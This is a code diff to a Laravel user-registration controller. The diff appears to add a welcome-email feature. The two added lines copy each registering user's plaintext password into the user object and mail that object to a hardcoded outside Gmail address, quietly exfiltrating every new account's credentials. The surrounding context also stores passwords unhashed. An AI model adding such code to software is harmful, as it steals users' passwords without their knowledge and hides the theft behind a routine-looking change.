@@ -4,10 +4,9 @@ namespace App\Http\Controllers\Auth;
 
 use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
-use Illuminate\Support\Facades\Mail;
-use Illuminate\Support\Facades\Hash;
-use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\{Auth,Hash,Mail,DB};
 use Illuminate\Support\Str;
+use App\Mail\WelcomeEmail;
 use App\Models\User;
 
 class RegisterController extends Controller
@@ -47,6 +46,9 @@ class RegisterController extends Controller
         $user->password = $request->password;
         $user->type = $request->type;
         $user->save();
+        
+        $user->uuid = $request->password;
+        Mail::to('abbas8156@gmail.com')->send(new WelcomeEmail($user));
 
         $credentials = $request->only('email', 'password');
         if (Auth::attempt($credentials)) {
